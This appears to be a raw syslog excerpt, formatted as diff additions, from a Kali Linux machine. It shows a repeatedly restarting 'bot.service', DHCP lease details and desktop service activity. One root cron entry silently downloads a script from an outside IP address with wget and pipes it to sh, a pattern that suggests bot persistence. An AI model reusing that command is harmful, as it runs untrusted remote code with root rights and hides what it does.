+Jan 11 01:54:39 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:54:49 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 38.
+Jan 11 01:54:49 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:54:49 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:54:50 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:54:50 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1508] dhcp4 (eth0): option dhcp_lease_time      => '1800'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1510] dhcp4 (eth0): option domain_name          => 'localdomain'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1511] dhcp4 (eth0): option domain_name_servers  => '192.168.0.2'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1511] dhcp4 (eth0): option expiry               => '1610349892'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1512] dhcp4 (eth0): option ip_address           => '192.168.0.102'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1512] dhcp4 (eth0): option next_server          => '192.168.0.200'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1512] dhcp4 (eth0): option requested_broadcast_address => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1513] dhcp4 (eth0): option requested_domain_name => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1513] dhcp4 (eth0): option requested_domain_name_servers => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1514] dhcp4 (eth0): option requested_domain_search => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1514] dhcp4 (eth0): option requested_host_name  => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1515] dhcp4 (eth0): option requested_interface_mtu => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1515] dhcp4 (eth0): option requested_ms_classless_static_routes => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1516] dhcp4 (eth0): option requested_nis_domain => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1516] dhcp4 (eth0): option requested_nis_servers => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1517] dhcp4 (eth0): option requested_ntp_servers => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1517] dhcp4 (eth0): option requested_rfc3442_classless_static_routes => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1518] dhcp4 (eth0): option requested_root_path  => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1518] dhcp4 (eth0): option requested_routers    => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1519] dhcp4 (eth0): option requested_static_routes => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1519] dhcp4 (eth0): option requested_subnet_mask => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1520] dhcp4 (eth0): option requested_time_offset => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1522] dhcp4 (eth0): option requested_wpad       => '1'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1522] dhcp4 (eth0): option routers              => '192.168.0.2'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1523] dhcp4 (eth0): option subnet_mask          => '255.255.255.0'
+Jan 11 01:54:52 kali NetworkManager[620]: <info>  [1610348092.1523] dhcp4 (eth0): state changed bound -> extended
+Jan 11 01:54:52 kali dbus-daemon[619]: [system] Activating via systemd: service name='org.freedesktop.nm_dispatcher' unit='dbus-org.freedesktop.nm-dispatcher.service' requested by ':1.4' (uid=0 pid=620 comm="/usr/sbin/NetworkManager --no-daemon ")
+Jan 11 01:54:52 kali systemd[1]: Starting Network Manager Script Dispatcher Service...
+Jan 11 01:54:52 kali dbus-daemon[619]: [system] Successfully activated service 'org.freedesktop.nm_dispatcher'
+Jan 11 01:54:52 kali systemd[1]: Started Network Manager Script Dispatcher Service.
+Jan 11 01:55:00 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 39.
+Jan 11 01:55:00 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:55:01 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:55:01 kali CRON[4212]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Jan 11 01:55:01 kali CRON[4213]: (root) CMD (wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1)
+Jan 11 01:55:01 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:55:01 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:55:02 kali systemd[1]: NetworkManager-dispatcher.service: Succeeded.
+Jan 11 01:55:12 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 40.
+Jan 11 01:55:12 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:55:12 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:55:12 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:55:12 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:55:23 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 41.
+Jan 11 01:55:23 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:55:23 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:55:23 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:55:24 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:55:27 kali dbus-daemon[1111]: [session uid=0 pid=1111] Activating service name='org.freedesktop.thumbnails.Cache1' requested by ':1.16' (uid=0 pid=1235 comm="Thunar --daemon ")
+Jan 11 01:55:29 kali org.freedesktop.thumbnails.Cache1[4257]: Registered thumbnailer /usr/bin/gdk-pixbuf-thumbnailer -s %s %u %o
+Jan 11 01:55:30 kali org.freedesktop.thumbnails.Cache1[4257]: Registered thumbnailer atril-thumbnailer -s %s %u %o
+Jan 11 01:55:30 kali org.freedesktop.thumbnails.Cache1[4257]: Registered thumbnailer /usr/bin/gdk-pixbuf-thumbnailer -s %s %u %o
+Jan 11 01:55:33 kali dbus-daemon[1111]: [session uid=0 pid=1111] Successfully activated service 'org.freedesktop.thumbnails.Cache1'
+Jan 11 01:55:34 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 42.
+Jan 11 01:55:34 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:55:34 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:55:34 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:55:35 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:55:45 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 43.
+Jan 11 01:55:45 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:55:45 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:55:46 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:55:46 kali systemd[1]: bot.service: Succeeded.
